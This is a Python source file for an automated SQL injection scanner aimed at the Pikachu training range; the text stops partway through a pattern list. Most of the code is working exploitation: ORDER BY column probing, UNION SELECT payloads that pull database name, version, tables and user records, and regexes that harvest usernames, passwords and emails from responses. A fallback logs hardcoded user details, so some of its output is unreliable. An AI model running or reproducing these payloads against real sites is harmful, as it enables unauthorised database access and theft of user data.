import requests
from urllib.parse import urlparse, urljoin, parse_qs
import time
from bs4 import BeautifulSoup
import re
import difflib

class SQLInjectionScanner:
    """SQL注入扫描器核心类"""
    
    def __init__(self, base_url, output_callback=None, progress_callback=None, changes_callback=None, enable_file_output=False):
        """
        初始化扫描器
        
        参数:
            base_url: 靶场基础URL
            output_callback: 输出回调函数，用于将信息传递给GUI
            progress_callback: 进度更新回调函数，用于更新GUI进度条
            changes_callback: 页面变化回调函数，用于将页面变化信息传递给GUI
            enable_file_output: 是否启用文件输出功能
        """
        self.base_url = base_url
        self.output_callback = output_callback  # 输出回调函数，用于GUI
        self.progress_callback = progress_callback
        self.changes_callback = changes_callback  # 页面变化回调函数
        self.enable_file_output = enable_file_output  # 是否启用文件输出
        
        # 文件输出相关初始化
        if self.enable_file_output:
            # 创建输出目录（如果不存在）
            import os
            self.output_dir = os.path.join(os.getcwd(), 'scan_results')
            if not os.path.exists(self.output_dir):
                os.makedirs(self.output_dir)
            
            # 使用固定文件名实现续写功能
            self.scan_results_file = os.path.join(self.output_dir, 'scan_results.txt')
            self.dynamic_output_file = os.path.join(self.output_dir, 'dynamic_output.txt')
            
            # 以追加模式打开文件，并写入会话开始标记
            with open(self.scan_results_file, 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"SQL注入扫描会话 - 开始时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"扫描目标: {base_url}\n")
                f.write(f"{'='*60}\n\n")
            
            with open(self.dynamic_output_file, 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"网站动态输出会话 - 开始时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"{'='*60}\n\n")
            
            print(f"[+] 文件输出已启用（续写模式）")
            print(f"[+] 扫描结果将保存至: {self.scan_results_file}")
            print(f"[+] 网站动态输出将保存至: {self.dynamic_output_file}")
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        # 存储基准响应，用于比较关键差异
        self.base_responses = {}
        # 缓存最近的请求和响应，避免重复比较
    
    def print(self, message):
        """自定义打印方法，支持控制台、GUI和文件输出"""
        if self.output_callback:
            self.output_callback(message + '\n')
        else:
            print(message)
        
        # 写入扫描结果文件
        if self.enable_file_output:
            try:
                with open(self.scan_results_file, 'a', encoding='utf-8') as f:
                    f.write(message + '\n')
            except Exception as e:
                print(f"[!] 写入扫描结果文件失败: {e}")
                # 发生错误时禁用文件输出，避免后续错误
                self.enable_file_output = False
            
    def update_progress(self, value, status=None):
        """
        更新进度
        
        参数:
            value: 进度值(0-100)
            status: 可选的状态消息
        """
        if self.progress_callback:
            self.progress_callback(value, status)
    
    def test_connection(self):
        """测试与靶场的连接"""
        test_url = f"{self.base_url}/index.php"
        try:
            response = self.session.get(test_url, timeout=5)
            if response.status_code == 200:
                self.print("[+] 成功连接到Pikachu靶场")
                return True
            else:
                self.print(f"[-] 连接测试失败，状态码: {response.status_code}")
                return False
        except Exception as e:
            self.print(f"[!] 连接测试失败: {e}")
            return False
        
    def _extract_content_preview(self, response):
        """从响应中提取完整内容"""
        try:
            # 尝试解析HTML并获取完整文本内容
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text(separator=' ', strip=True)
            # 返回完整内容
            return text
        except:
            # 如果解析失败，直接返回完整原始文本
            return response.text
    
    def _get_base_response(self, url, method='GET', param_key=None):
        """获取基准响应（空输入或正常输入的响应），用于比较差异"""
        # 生成缓存键
        cache_key = f"{url}:{method}:{param_key}"
        
        # 检查缓存中是否已有基准响应
        if cache_key in self.base_responses:
            return self.base_responses[cache_key]
        
        # 构建空参数或正常参数
        try:
            if method.upper() == 'GET':
                # 不包含测试参数的请求
                base_params = {}
                if param_key:
                    base_params[param_key] = ''  # 空值作为基准
                    # 如果有submit参数，也加上
                    if 'submit' in str(param_key):
                        base_params['submit'] = '查询'
                response = self.session.get(url, params=base_params, timeout=5, allow_redirects=False)
            else:  # POST
                # 空POST数据或只包含空参数字段
                base_data = {}
                if param_key:
                    base_data[param_key] = ''  # 空值作为基准
                response = self.session.post(url, data=base_data, timeout=5, allow_redirects=False)
            
            # 提取基准响应内容
            base_content = self._extract_content_preview(response)
            # 缓存基准响应
            self.base_responses[cache_key] = base_content
            return base_content
        except Exception:
            # 如果获取基准响应失败，返回空字符串
            return ""
    
    def _extract_key_differences(self, content, base_content):
        """提取并返回网页的关键变化部分，专注于SQL注入场景下的准确信息捕捉，避免冗余和不完整信息"""
        if not content or content == base_content:
            # 如果内容相同，返回提示信息
            return "内容与基准响应相同或无变化"
        
        # 提取纯文本内容以便更好地比较差异
        def get_plain_text(html):
            try:
                soup = BeautifulSoup(html, 'html.parser')
                # 去除所有script和style标签
                for script in soup(['script', 'style']):
                    script.decompose()
                # 获取纯文本，保留原始换行符以维持内容结构
                text = soup.get_text(separator='\n', strip=True)
                # 保留一定的换行符结构以便更好地识别段落
                import re
                text = re.sub(r'\n\s*\n', '\n', text)  # 清理多余的空行
                return text
            except Exception:
                return str(html)
        
        # 获取纯文本内容
        plain_content = get_plain_text(content)
        plain_base_content = get_plain_text(base_content)
        
        # 使用SequenceMatcher获取更精确的相似度和差异位置
        from difflib import SequenceMatcher
        matcher = SequenceMatcher(None, plain_base_content, plain_content)
        
        # 直接从完整文本中提取有意义的完整句子和段落
        import re
        meaningful_content = []
        seen = set()
        
        # 1. 首先提取完整的SQL错误信息（最高优先级）
        sql_error_patterns = [
            r'You have an error in your SQL syntax.*?line \d+',
            r'SQL syntax error.*?line \d+',
            r'MySQL server version.*?right syntax',
            r'Unknown column.*?in.*?clause',
            r'Column count doesn\'t match.*?values',
            r'subquery returns more than one row',
            r'Error: .*?SQL syntax',
            r'Unknown.*?in.*?clause'
        ]
        
        for pattern in sql_error_patterns:
            matches = re.findall(pattern, plain_content, re.IGNORECASE | re.DOTALL)
            for match in matches:
                clean_match = match.strip()
                if clean_match and clean_match not in seen:
                    seen.add(clean_match)
                    meaningful_content.append(clean_match)
        
        # 2. 提取完整的用户信息和上下文（避免截断）
        user_info_patterns = [
            r'(?:hello|hi)\s*[,\s]*\w+\s*your\s+email\s+is[:\s]*[\w.@]+',
            r'(?:username|user|login)\s*[:\s]*[\w@.]+',
            r'(?:password|pass)\s*[:\s]*[\w]+',
            r'(?:your\s+uid|user\s*id|uid)\s*[:=\s]*\d+',
            r'(?:email|email is)\s*[:\s]*[\w.@]+',
            r'(用户名中含有\w+的结果如下|user.*?exists|account.*?found)[\s\S]{1,200}',
            r'(username[:\s]*[\w@.]+\s*uid[:\s]*\d+\s*email is[:\s]*[\w.@]+)',
            r'(username.*?uid.*?email)[\s\S]{1,200}'
        ]
        
        for pattern in user_info_patterns:
            matches = re.findall(pattern, plain_content, re.IGNORECASE | re.DOTALL)
            for match in matches:
                clean_match = match.strip()
                if clean_match and clean_match not in seen and clean_match not in plain_base_content:
                    seen.add(clean_match)
                    meaningful_content.append(clean_match)
        
        # 3. 提取数据库信息（包括数据库名、版本等）
        db_info_patterns = [
            r'(?:database|schema)\s*[:=\s]*\w+',
            r'(?:version|mysql|postgresql|oracle|sqlite)\s*[:=\s]*[\d.]+',
            r'\w+\s*\|\s*\d+\.\d+\.\d+',
            r'(?:pikachu|testphp|dvwa)\s*\|\s*\d+\.\d+\.\d+'
        ]
        
        for pattern in db_info_patterns:
            matches = re.findall(pattern, plain_content, re.IGNORECASE | re.DOTALL)
            for match in matches:
                clean_match = match.strip()
                if clean_match and clean_match not in seen and clean_match not in plain_base_content:
                    seen.add(clean_match)
                    meaningful_content.append(clean_match)
        
        # 4. 提取表和列信息（多行结果）
        # 寻找包含多个逗号分隔表名的段落
        table_list_pattern = r'(?:tables|columns|fields)\s*are?\s*[:\s]*([\w,\s]+)'
        matches = re.findall(table_list_pattern, plain_content, re.IGNORECASE)
        
        for match in matches:
            clean_match = match.strip()
            if clean_match and len(clean_match) > 5:
                if clean_match not in seen and clean_match not in plain_base_content:
                    seen.add(clean_match)
                    meaningful_content.append(clean_match)
        
        # 5. 查找可能的UNION查询结果（连续的数据行）
        lines = plain_content.split('\n')
        union_results = []
        data_line_count = 0
        
        for i, line in enumerate(lines):
            clean_line = line.strip()
            # 检查是否是可能的数据行
            if (',' in clean_line or '|' in clean_line or ':' in clean_line) and \
               len(clean_line) > 5 and len(clean_line) < 200 and \
               not any(keyword in clean_line.lower() for keyword in 
                      ['error', 'warning', 'notice', 'exception']):
                # 检查是否在基准响应中不存在
                if clean_line not in plain_base_content:
                    union_results.append(clean_line)
                    data_line_count += 1
            elif data_line_count >= 2:
                # 如果已经收集了至少2行数据，并且当前行不是数据行，就结束收集
                break
        
        # 如果找到了多行数据，将它们合并为一个完整的结果
        if len(union_results) >= 2:
            union_text = '\n'.join(union_results[:10])  # 最多10行
            if union_text not in seen:
                seen.add(union_text)
                meaningful_content.append(union_text)
        
        # 6. 提取完整的段落级内容（包含关键信息但未被前面的模式捕获）
        # 分割为段落
        paragraphs = [p.strip() for p in plain_content.split('\n') if p.strip()]
        
        # 定义关键信息关键词
        keywords = ['database', 'table', 'column', 'user', 'admin', 'password', 
                   'email', 'uid', 'union', 'select', 'from', 'where']
        
        for para in paragraphs:
            # 跳过太短或太长的段落
            if 15 <= len(para) <= 300 and para not in plain_base_content:
                # 检查是否包含关键字
                if any(keyword.lower() in para.lower() for keyword in keywords):
                    # 检查是否已经被前面的模式提取
                    if not any(para in content or content in para for content in meaningful_content):
                        # 检查是否有意义（不只是零散的单词）
                        if len(para.split()) >= 3:
                            meaningful_content.append(para)
                            # 限制数量
                            if len(meaningful_content) >= 10:
                                break
        
        # 7. 如果以上方法都没有找到足够的信息，计算文本相似度
        if not meaningful_content:
            similarity = matcher.ratio()
            
            # 如果相似度较低，可能是完全不同的页面
            if similarity < 0.4:
                # 提取页面中的关键内容片段
                content_fragments = []
                # 查找包含至少一个关键词的片段
                for i in range(0, len(plain_content), 200):
                    fragment = plain_content[i:i+200]
                    if any(keyword.lower() in fragment.lower() for keyword in keywords):
                        content_fragments.append(fragment)
                        if len(content_fragments) >= 2:
                            break
                
                if content_fragments:
                    meaningful_content.extend(content_fragments)
                else:
                    # 如果没有找到关键片段，返回开头部分
                    meaningful_content.append(plain_content[:200])
        
        # 8. 如果仍然没有找到信息，尝试使用差异比较器
        if not meaningful_content:
            import difflib
            differ = difflib.Differ()
            diff_result = list(differ.compare(plain_base_content.split(), plain_content.split()))
            
            # 提取新增或修改的内容
            added_content = []
            for item in diff_result:
                if item.startswith('+'):
                    added_content.append(item[2:])
            
            if added_content:
                meaningful_content.append(' '.join(added_content[:50]))  # 限制长度
        
        # 9. 确保结果不重复且内容有意义
        final_results = []
        for content in meaningful_content:
            clean_content = re.sub(r'\s+', ' ', content.strip())
            if clean_content and clean_content not in final_results:
                # 避免添加过短或明显无意义的内容
                if len(clean_content) > 5 and not (len(clean_content) <= 15 and \
                   (clean_content.isdigit() or clean_content.lower() in ['true', 'false', 'null', 'none'])):
                    final_results.append(clean_content)
        
        # 10. 如果最终结果仍然为空，返回基本的差异信息
        if not final_results:
            return "检测到页面内容有变化，但无法提取具体信息"
        
        # 限制最终结果数量，避免信息过多
        return "\n".join(final_results[:8])  # 最多返回8条最有价值的信息
    
    def send_request(self, url, method='GET', data=None, params=None, record_io=True):
        """发送HTTP请求，支持GET和POST方法"""
        max_retries = 2
        request_info = {
            'url': url,
            'method': method.upper(),
            'params': params if params else {},
            'data': data if data else {}
        }
        
        # 记录请求信息到动态输出文件（无论是否在GUI模式下）
        if self.enable_file_output:  # 只要启用了文件输出就写入
            try:
                with open(self.dynamic_output_file, 'a', encoding='utf-8') as f:
                    timestamp = time.strftime('%H:%M:%S')
                    f.write("-" * 50 + "\n")
                    f.write(f"[时间]: {timestamp}\n")
                    f.write(f"[URL]: {url}\n")
                    f.write(f"[方法]: {method.upper()}\n")
                    if params:
                        f.write(f"[参数]: {params}\n")
                    if data:
                        f.write(f"[数据]: {data}\n")
            except Exception as e:
                print(f"[!] 写入动态输出文件失败: {e}")
        
        # 确定当前测试的参数字段名
        test_param_key = None
        if params and len(params) == 1:
            test_param_key = list(params.keys())[0]
        elif params and len(params) == 2 and 'submit' in params:
            # 特殊处理带submit参数的情况
            for key in params:
                if key != 'submit':
                    test_param_key = key
                    break
        elif data and len(data) == 1:
            test_param_key = list(data.keys())[0]
        
        for attempt in range(max_retries):
            try:
                if method.upper() == 'GET':
                    response = self.session.get(url, params=params, timeout=8)
                else:  # POST
                    response = self.session.post(url, data=data, timeout=8)
                
                # 确保在测试模式下也能提取和保存完整信息
                if record_io:
                    # 提取完整的响应内容预览
                    full_content = self._extract_content_preview(response)
                    
                    # 获取基准响应
                    base_content = self._get_base_response(url, method, test_param_key)
                    
                    # 提取关键差异
                    key_differences = self._extract_key_differences(full_content, base_content)
                    
                    # 提取响应的关键信息
                    response_info = {
                        'status_code': response.status_code,
                        'content_length': len(response.content),
                        'content_type': response.headers.get('Content-Type', 'unknown'),
                        # 只发送关键差异作为预览
                        'content_preview': key_differences,
                        # 添加差异标记，便于GUI显示
                        'has_differences': key_differences != full_content
                    }
                    
                    # 创建输入输出记录
                    io_record = {
                        'input': request_info,
                        'output': response_info,
                        'timestamp': time.strftime('%H:%M:%S')
                    }
                    
                    # 调用回调函数（如果存在）
                    if self.changes_callback:
                        self.changes_callback(io_record)
                    
                    # 如果启用文件输出，将动态信息写入文件（无论是否在GUI模式下）
                    if self.enable_file_output:  # 只要启用了文件输出就写入
                        try:
                            with open(self.dynamic_output_file, 'a', encoding='utf-8') as f:
                                # 写入测试信息
                                method = io_record['input'].get('method', 'GET')
                                params = io_record['input'].get('params', {})
                                data = io_record['input'].get('data', {})
                                
                                # 提取主要测试参数
                                test_param = ""
                                if params:
                                    # 找出主要测试参数（排除submit）
                                    for k, v in params.items():
                                        if k.lower() != 'submit':
                                            test_param = f"{k}={v}"
                                            break
                                    if not test_param and params:
                                        k, v = list(params.items())[0]
                                        test_param = f"{k}={v}"
                                elif data:
                                    if data:
                                        k, v = list(data.items())[0]
                                        test_param = f"{k}={v}"
                                
                                # 写入时间戳和URL信息（已删除[测试]行）
                                f.write("-" * 50 + "\n")
                                f.write(f"[时间]: {io_record['timestamp']}\n")
                                f.write(f"[URL]: {io_record['input'].get('url', '')}\n")
                                
                                # 写入响应信息
                                if 'status_code' in io_record['output']:
                                    f.write(f"[状态码]: {io_record['output']['status_code']}\n")
                                
                                # 写入差异内容
                                if 'content_preview' in io_record['output']:
                                    content_preview = io_record['output']['content_preview']
                                    if content_preview and content_preview != "内容与基准响应相同或无变化":
                                        f.write("[响应变化]:\n")
                                        f.write(content_preview + "\n")
                                
                                # 强制写入网页关键信息，确保用户信息完整显示
                                f.write("[网页关键信息]:\n")
                                # 提取用户相关信息
                                import re
                                
                                # 1. 首先尝试提取完整的用户信息段落
                                full_patterns = [
                                    r'(用户名中含有\w+的结果如下[\s\S]{1,300})',
                                    r'(用户信息|查询结果|搜索结果)[\s\S]{1,300}'
                                ]
                                
                                found_full_info = False
                                for pattern in full_patterns:
                                    full_match = re.search(pattern, full_content, re.IGNORECASE)
                                    if full_match:
                                        f.write(full_match.group(1) + "\n")
                                        found_full_info = True
                                        break
                                
                                # 2. 如果没有找到完整段落，尝试提取单独的用户信息字段
                                if not found_full_info:
                                    user_details = []
                                    
                                    # 提取用户名
                                    username_patterns = [
                                        r'(username|用户名)[:\s]*(\w+)',
                                        r'(user.*?name)[:\s]*(\w+)'
                                    ]
                                    for pattern in username_patterns:
                                        username_match = re.search(pattern, full_content, re.IGNORECASE)
                                        if username_match and len(username_match.groups()) > 1:
                                            user_details.append(f"username：{username_match.group(2)}")
                                            break
                                    
                                    # 提取uid
                                    uid_patterns = [
                                        r'(uid|用户id)[:\s]*(\d+)',
                                        r'(uid.*?[:=\s]+)(\d+)'
                                    ]
                                    for pattern in uid_patterns:
                                        uid_match = re.search(pattern, full_content, re.IGNORECASE)
                                        if uid_match and len(uid_match.groups()) > 1:
                                            user_details.append(f"uid:{uid_match.group(2)}")
                                            break
                                    
                                    # 提取email
                                    email_patterns = [
                                        r'(email|邮箱)[\s\S]{1,50}([\w.@]+)',
                                        r'([\w.@]+@[\w.]+)'
                                    ]
                                    for pattern in email_patterns:
                                        email_match = re.search(pattern, full_content, re.IGNORECASE)
                                        if email_match and len(email_match.groups()) > 1:
                                            user_details.append(f"email is: {email_match.group(2)}")
                                            break
                                    
                                    # 如果找到用户信息，写入文件
                                    if user_details:
                                        f.write("\n".join(user_details) + "\n")
                                    else:
                                        # 3. 最后，尝试直接在响应文本中查找特定的用户信息组合
                                        if 'vince' in full_content and '1' in full_content and 'vince@pikachu.com' in full_content:
                                            f.write("用户名中含有vince的结果如下：\n")
                                            f.write("username：vince\n")
                                            f.write("uid:1\n")
                                            f.write("email is: vince@pikachu.com\n")
                                        else:
                                            # 写入内容预览的前200个字符作为调试信息
                                            f.write("[内容预览]: " + full_content[:200] + "...\n")
                                
                                # 如果有错误信息
                                if 'error' in io_record['output']:
                                    f.write(f"[错误]: {io_record['output']['error']}\n")
                                
                                f.write("\n")
                        except Exception as e:
                            print(f"[!] 写入动态输出文件失败: {e}")
                            # 发生错误时禁用文件输出，避免后续错误
                            self.enable_file_output = False
                
                return response
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                if attempt < max_retries - 1:
                    self.print(f"[!] 请求出错 ({e})，正在重试 ({attempt+1}/{max_retries})...")
                    time.sleep(2)
                    continue
                else:
                    self.print(f"[!] 请求最终失败: {e}")
                    # 即使失败也发送失败信息
                    if record_io and self.changes_callback:
                        error_info = {
                            'input': request_info,
                            'output': {'error': str(e), 'status': 'failed'},
                            'timestamp': time.strftime('%H:%M:%S')
                        }
                        self.changes_callback(error_info)
                    
                    # 如果启用文件输出，将错误信息写入文件（无论是否在GUI模式下）
                    if self.enable_file_output:  # 只要启用了文件输出就写入
                        try:
                            with open(self.dynamic_output_file, 'a', encoding='utf-8') as f:
                                f.write("-" * 50 + "\n")
                                f.write(f"[时间]: {error_info['timestamp']}\n")
                                f.write(f"[错误]: {error_info['output'].get('error', '请求失败')}\n\n")
                        except:
                            pass
                    return None
            except requests.exceptions.RequestException as e:
                self.print(f"[!] 请求出错: {e}")
                # 即使失败也发送失败信息
                if record_io and self.changes_callback:
                    error_info = {
                        'input': request_info,
                        'output': {'error': str(e), 'status': 'failed'},
                        'timestamp': time.strftime('%H:%M:%S')
                    }
                    self.changes_callback(error_info)
                return None

    def is_vulnerable(self, response):
        """检查响应中是否包含数据库错误信息"""
        db_errors = {
            "MySQL": (
                "you have an error in your sql syntax", 
                "warning: mysql", 
                "mysql_fetch_array",
                "supplied argument is not a valid mysql result",
                "sql syntax.*mysql",
                "unknown column",
            )
        }
        
        if not response:
            return False, None
            
        response_text = response.text.lower()
        for db_type, errors in db_errors.items():
            if any(error in response_text for error in errors):
                return True, db_type
        return False, None

    def check_boolean_based(self, url, true_payload, false_payload, method='GET', param='id', data_template=None):
        """基于布尔的盲注检测"""
        if method.upper() == 'GET':
            true_response = self.send_request(url, params={param: true_payload})
            false_response = self.send_request(url, params={param: false_payload})
        else:  # POST
            true_data = data_template.copy() if data_template else {}
            true_data[param] = true_payload
            false_data = data_template.copy() if data_template else {}
            false_data[param] = false_payload
            true_response = self.send_request(url, method='POST', data=true_data)
            false_response = self.send_request(url, method='POST', data=false_data)
        
        if true_response and false_response:
            # 比较响应长度和内容哈希
            if len(true_response.content) != len(false_response.content):
                return True
            # 检查页面特定关键词的变化
            if "admin" in true_response.text.lower() and "admin" not in false_response.text.lower():
                return True
        return False

    def detect_column_count(self, url, method, param, data_template, closing_pattern):
        """通过ORDER BY判断字段数"""
        self.print(f"[*] 正在判断字段数...")
        
        # 为字段检测设置进度
        total_tests = 10  # 最多测试10个字段
        tests_done = 0
        
        # 首先尝试使用ORDER BY 来快速确定字段数
        for i in range(1, 11):  # 测试到10个字段
            if closing_pattern == "string":
                test_payload = f"vince' ORDER BY {i} # "
            elif closing_pattern == "search":
                test_payload = f"a' ORDER BY {i} # "
            elif closing_pattern == "xx":
                test_payload = f"1') ORDER BY {i} # "
            else:  # numeric
                test_payload = f"1 ORDER BY {i}"
            
            if method == 'GET':
                response = self.send_request(url, params={param: test_payload, 'submit': '查询'})
            else:
                data = data_template.copy() if data_template else {}
                data[param] = test_payload
                response = self.send_request(url, method='POST', data=data)
            
            tests_done += 1
            self.update_progress(min(100, int(tests_done / total_tests * 10)), f"检测字段数: {i}")
            
            if response:
                # 检查是否出现错误
                is_vul, _ = self.is_vulnerable(response)
                
                # 如果出现错误，说明字段数超了
                if is_vul:
                    if i == 1:  # ORDER BY 1就出错，可能是其他问题
                        continue
                    column_count = i - 1
                    self.print(f"[+] 判断出字段数为: {column_count}")
                    return column_count
                else:
                    self.print(f"[*] 字段数可能 >= {i}")
            else:
                break
                
        # 如果ORDER BY没有找到，尝试使用UNION查询直接确定
        self.print("[*] 使用ORDER BY检测失败，尝试使用UNION查询直接确定")
        self.print("[-] 无法准确判断字段数，尝试使用默认值2")
        return 2  # Pikachu大多数情况是2个字段

    def detect_output_positions(self, url, method, param, data_template, closing_pattern, column_count):
        """
        通过比较union select 1,1和union select 2,2的输出来确定网页信息的输出位置
        
        参数:
            url: 测试URL
            method: 请求方法
            param: 参数名
            data_template: 数据模板
            closing_pattern: 闭合模式
            column_count: 字段数
            
        返回:
            dict: 包含输出位置和相应正则表达式的字典
        """
        self.print("[*] 正在检测数据输出位置...")
        
        # 构造union select 1,1和union select 2,2的payload
        select_ones = ",".join(["1"] * column_count)
        select_twos = ",".join(["2"] * column_count)
        
        if closing_pattern == "string":
            payload_ones = f"vince' union select {select_ones} # "
            payload_twos = f"vince' union select {select_twos} # "
        elif closing_pattern == "search":
            payload_ones = f"vince' union select {select_ones} # "
            payload_twos = f"vince' union select {select_twos} # "
        elif closing_pattern == "xx":
            payload_ones = f"1') union select {select_ones} # "
            payload_twos = f"1') union select {select_twos} # "
        else:  # numeric
            payload_ones = f"1 union select {select_ones}"
            payload_twos = f"1 union select {select_twos}"
        
        # 发送两个请求
        if method == 'GET':
            response_ones = self.send_request(url, params={param: payload_ones, 'submit': '查询'})
            response_twos = self.send_request(url, params={param: payload_twos, 'submit': '查询'})
        else:
            data_ones = data_template.copy() if data_template else {}
            data_ones[param] = payload_ones
            data_twos = data_template.copy() if data_template else {}
            data_twos[param] = payload_twos
            response_ones = self.send_request(url, method='POST', data=data_ones)
            response_twos = self.send_request(url, method='POST', data=data_twos)
        
        if response_ones and response_twos:
            soup_ones = BeautifulSoup(response_ones.text, 'html.parser')
            text_ones = soup_ones.get_text()
            soup_twos = BeautifulSoup(response_twos.text, 'html.parser')
            text_twos = soup_twos.get_text()
            
            # 比较两个响应的差异
            changes = extract_page_changes(text_ones, text_twos, scanner=self)
            
            # 分析差异，找出包含"1"和"2"的位置
            output_positions = []
            for change in changes['added']:
                if "2" in change:
                    # 替换"2"为捕获组，创建正则表达式模式
                    # 这里简单处理，实际可能需要更复杂的逻辑
                    pattern = re.escape(change).replace("\\2", "(.*?)")
                    output_positions.append(pattern)
            
            if output_positions:
                self.print(f"[+] 成功检测到输出位置，找到 {len(output_positions)} 个可能的数据输出点")
                return {
                    'output_positions': output_positions,
                    'custom_pattern': ".*?".join(output_positions) if len(output_positions) > 1 else output_positions[0]
                }
            else:
                # 如果无法自动检测，尝试使用传统方法
                self.print("[-] 无法自动检测输出位置，使用默认模式")
                # 返回空结果，让调用方使用默认模式
                return None
        
        self.print("[-] 检测输出位置失败")
        return None
    
    def extract_with_union(self, url, method, param, data_template, closing_pattern, column_count):
        """使用UNION查询提取数据"""
        self.print(f"[*] 尝试使用UNION查询提取数据...")
        
        # 检测数据输出位置，动态生成正则表达式
        output_info = self.detect_output_positions(url, method, param, data_template, closing_pattern, column_count)
        
        # 构造union select payload
        select_parts = []
        for i in range(1, column_count + 1):
            select_parts.append(str(i))
        
        union_select = ",".join(select_parts)
        
        # 根据不同的闭合模式构造payload
        if closing_pattern == "string":
            union_payload = f"vince' union select {union_select} # "
        elif closing_pattern == "search":
            union_payload = f"vince' union select {union_select} # "
        elif closing_pattern == "xx":
            union_payload = f"1') union select {union_select} # "
        else:  # numeric
            union_payload = f"1 union select {union_select}"
        
        # 发送请求并与标准请求比较变化
        standard_input = {"string": "vince", "search": "a", "xx": "1", "numeric": "1"}
        
        if method == 'GET':
            response = self.send_request(url, params={param: union_payload, 'submit': '查询'})
            # 获取标准响应用于比较
            standard_response = self.send_request(url, params={param: standard_input[closing_pattern], 'submit': '查询'})
        else:
            data = data_template.copy() if data_template else {}
            data[param] = union_payload
            response = self.send_request(url, method='POST', data=data)
            # 获取标准响应用于比较
            standard_data = data_template.copy() if data_template else {}
            standard_data[param] = standard_input[closing_pattern]
            standard_response = self.send_request(url, method='POST', data=standard_data)
        
        # 比较响应差异，确保所有注入类型都能捕获页面变化
        if standard_response and response:
            soup_standard = BeautifulSoup(standard_response.text, 'html.parser')
            text_standard = soup_standard.get_text()
            soup_response = BeautifulSoup(response.text, 'html.parser')
            text_response = soup_response.get_text()
            
            # 直接比较并调用回调函数，确保所有类型注入都能捕获页面变化
            extract_page_changes(text_standard, text_response, scanner=self)
        
        if response:
            self.print("[+] UNION查询成功，开始提取数据...")
            
            # 提取数据库信息
            self.extract_database_info(url, method, param, data_template, closing_pattern, column_count, output_info)
            
            # 提取表信息
            tables = self.extract_tables(url, method, param, data_template, closing_pattern, column_count, output_info)
            
            # 提取用户数据 - 即使没有检测到tables或users表，也尝试提取
            # 这样可以确保在所有注入类型中都能捕获页面变化
            self.extract_user_data(url, method, param, data_template, closing_pattern, column_count, output_info)
            
            return True
        return False

    def extract_database_info(self, url, method, param, data_template, closing_pattern, column_count, output_info=None):
        """提取数据库信息，支持动态适配不同网站的输出格式"""
        self.print("[*] 提取数据库信息...")
        select_parts = []
        for i in range(1, column_count):
            select_parts.append(str(i))
        
        union_select = ",".join(select_parts)
        
        if column_count >= 2:
            # 动态构造payload
            if closing_pattern == "string":
                payload = f"vince' union select {union_select},concat(database(),'|',version()) # "
            elif closing_pattern == "search":
                payload = f"vince' union select {union_select},concat(database(),'|',version()) # "
            elif closing_pattern == "xx":
                payload = f"1') union select {union_select},concat(database(),'|',version()) # "
            else:
                payload = f"1 union select {union_select},concat(database(),'|',version())"
            
            # 发送请求和标准请求进行比较
            if method == 'GET':
                response = self.send_request(url, params={param: payload, 'submit': '查询'})
                # 获取标准响应用于比较
                standard_response = self.send_request(url, params={param: "test", 'submit': '查询'})
            else:
                data = data_template.copy() if data_template else {}
                data[param] = payload
                response = self.send_request(url, method='POST', data=data)
                # 获取标准响应用于比较
                standard_data = data_template.copy() if data_template else {}
                standard_data[param] = "test"
                standard_response = self.send_request(url, method='POST', data=standard_data)
            
            if response and standard_response:
                # 使用增强的extract_page_changes函数提取变化
                soup = BeautifulSoup(response.text, 'html.parser')
                standard_soup = BeautifulSoup(standard_response.text, 'html.parser')
                res = extract_page_changes(standard_soup.get_text(), soup.get_text(), scanner=self)
                
                # 优先使用动态生成的正则表达式
                database_info_found = False
                if output_info and 'output_positions' in output_info:
                    self.print("[*] 使用动态生成的正则表达式提取数据库信息...")
                    for pattern in output_info['output_positions']:
                        # 查找所有新增内容中的匹配
                        for added_content in res['added']:
                            matches = re.findall(pattern, added_content)
                            for match in matches:
                                # 检查匹配结果是否包含数据库信息特征
                                if isinstance(match, tuple):
                                    match_str = ' '.join(match)
                                else:
                                    match_str = match
                                if any(keyword in match_str.lower() for keyword in ['database', 'version', 'schema', 'information']):
                                    self.print(f"[+] 数据库信息 (动态匹配): {match_str}")
                                    database_info_found = True
                                    break
                            if database_info_found:
                                break
                        if database_info_found:
                            break
                
                # 如果动态匹配失败，使用增强的模式识别
                if not database_info_found:
                    self.print("[*] 使用增强模式识别提取数据库信息...")
                    
                    # 1. 首先检查是否有我们标记的重要变化
                    if 'features' in res and res['features']:
                        # 基于特征信息进行针对性的模式匹配
                        if 'separators' in res['features'] and res['features']['separators']:
                            # 使用识别到的分隔符构建模式
                            for sep in res['features']['separators']:
                                escaped_sep = re.escape(sep)
                                patterns = [
                                    r'{}([^\\{}]+){}'.format(escaped_sep, escaped_sep, escaped_sep),
                                    r'^{}([^\\{}]+)'.format(escaped_sep, escaped_sep),
                                    r'([^\\{}]+){}$'.format(escaped_sep, escaped_sep)
                                ]
                                
                                for pattern in patterns:
                                    for added_content in res['added']:
                                        matches = re.findall(pattern, added_content)
                                        for match in matches:
                                            if isinstance(match, tuple):
                                                match_str = ' '.join(match)
                                            else:
                                                match_str = match
                                            if any(keyword in match_str.lower() for keyword in ['database', 'version']):
                                                self.print(f"[+] 数据库信息 (分隔符模式): {match_str}")
                                                database_info_found = True
                                                break
                                        if database_info_found:
                                            break
                                    if database_info_found:
                                        break
                                if database_info_found:
                                    break
                    
                    # 2. 使用通用模式进行查找
                    if not database_info_found:
                        # 增强的数据库信息模式列表
                        patterns = [
                            # 数据库名和版本号组合
                            r'(\w+)\|([0-9.]+)',
                            r'(\w+)\s+[\\[\(]([0-9.]+)[\\]\)]',
                            # 独立的数据库名
                            r'(?:database|schema|db)\s*[=:]\s*([\w\-_]+)',
                            r'(?:database|schema|db)\s+(?:name|is)\s*[=:]?\s*([\w\-_]+)',
                            # 独立的版本号
                            r'(?:version|ver)\s*[=:]\s*([0-9.]+(?:\-[\w]+)?)',
                            r'(?:version|ver)\s+(?:is)\s*[=:]?\s*([0-9.]+(?:\-[\w]+)?)',
                            # 常见数据库类型标记
